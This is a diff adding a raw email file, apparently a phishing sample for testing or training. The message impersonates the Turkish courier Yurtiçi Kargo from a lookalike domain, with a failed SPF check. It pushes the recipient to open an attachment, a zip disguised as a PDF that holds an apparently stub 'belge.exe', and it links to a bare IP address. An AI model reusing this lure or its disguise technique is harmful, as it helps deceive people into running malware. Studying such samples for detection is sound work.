@@ -1,0 +1,34 @@
+Return-Path: <kargo@yurtici-teslimat.icu>
+Received: from vps-77213.hostbox.ru (vps-77213.hostbox.ru [91.215.85.40])
+	by mx.ornekposta.com (Postfix) with ESMTP id 7C11A
+	for <mehmet@ornekposta.com>; Tue, 14 Oct 2025 14:02:11 +0300 (+03)
+Received-SPF: softfail (mx.ornekposta.com: domain of transitioning yurtici-teslimat.icu does not designate 91.215.85.40 as permitted sender)
+From: "Yurtici Kargo" <kargo@yurtici-teslimat.icu>
+To: mehmet@ornekposta.com
+Subject: Gonderiniz teslim edilemedi - Teslimat belgesi ekte
+Date: Tue, 14 Oct 2025 14:02:05 +0300
+Message-ID: <a81f0c2d@yurtici-teslimat.icu>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_Part_01"
+
+------=_Part_01
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 8bit
+
+Sayın alıcı,
+
+Gönderiniz adres bilgisi eksik olduğu için teslim edilemedi. Ekteki teslimat belgesini açarak adres bilgilerinizi güncelleyin. Belge 48 saat içinde onaylanmazsa gönderi iade edilecektir.
+
+Takip: http://91.215.85.40/takip/TR7781203
+
+Yurtiçi Kargo Müşteri Hizmetleri
+
+------=_Part_01
+Content-Type: application/zip; name="Teslimat_Belgesi.pdf.zip"
+Content-Disposition: attachment; filename="Teslimat_Belgesi.pdf.zip"
+Content-Transfer-Encoding: base64
+
+UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAAYmVsZ2UuZXhlAwAAAFBLAQIUABQAAAAIAAAA
+IQAAAAAAAAAAAAAAAAAJAAAAAAAAAAAAAAAAAAAAAABiZWxnZS5leGVQSwUGAAAAAAEAAQA3AAAA
+JwAAAAAA
+------=_Part_01--
